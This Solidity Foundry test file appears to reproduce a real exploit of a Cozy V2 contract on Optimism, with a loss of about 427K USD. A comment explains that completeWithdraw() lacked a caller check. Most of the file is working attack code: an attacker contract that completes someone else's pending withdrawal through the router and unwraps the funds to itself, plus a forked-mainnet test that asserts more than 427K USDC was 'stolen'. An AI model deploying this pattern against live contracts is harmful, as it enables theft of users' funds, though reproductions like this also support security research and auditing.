// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: ~427K USD
// Attacker: https://optimistic.etherscan.io/address/0xce196f0a4f0c08e152ae66ecbc06675f44f68e66
// Attack Tx: https://optimistic.etherscan.io/tx/0x71e72cae2149920bc89ae3287edf8c7e65d454d7fd5e24b590c1b4ea36c0a517
// Vulnerable CSET: https://optimistic.etherscan.io/address/0xbbf3a80c2ec900d877c13302f4407df08aeffd28
//
// The two-step withdrawal flow did not verify that completeWithdraw() was
// called by the account that initiated the redemption. Anyone could complete
// a pending redemption and choose their own receiver when unwrapping it.

interface ICozyRouter {
    function aggregate(
        bytes[] calldata calls
    ) external payable returns (bytes[] memory returnData);
}

contract CozyV2Attacker {
    ICozyRouter private constant ROUTER = ICozyRouter(0x562460D8cFB40Ada3eA91d8Cf98eAF25D53d53D8);
    address private constant CSET = 0xBBf3a80c2ec900d877c13302f4407df08AeFfd28;
    address private constant WRAPPED_ASSET = 0xEABD74ee7399b38d63069039BbD9F1c2fcC8EB88;

    function attack() external {
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("completeWithdraw(address,uint64)", CSET, uint64(6));
        calls[1] = abi.encodeWithSignature(
            "unwrapWrappedAssetViaConnectorForWithdraw(address,address)", WRAPPED_ASSET, address(this)
        );
        ROUTER.aggregate(calls);
    }
}

contract CozyV2ExploitTest is Test {
    IERC20 private constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    uint256 private constant FORK_BLOCK = 140_421_917;

    function setUp() public {
        vm.createSelectFork("https://mainnet.optimism.io", FORK_BLOCK);
    }

    function testExploit() public {
        CozyV2Attacker attacker = new CozyV2Attacker();
        uint256 balanceBefore = USDC.balanceOf(address(attacker));

        attacker.attack();

        uint256 stolen = USDC.balanceOf(address(attacker)) - balanceBefore;
        emit log_named_decimal_uint("Stolen USDC", stolen, 6);
        assertGt(stolen, 427_000e6);
    }
}
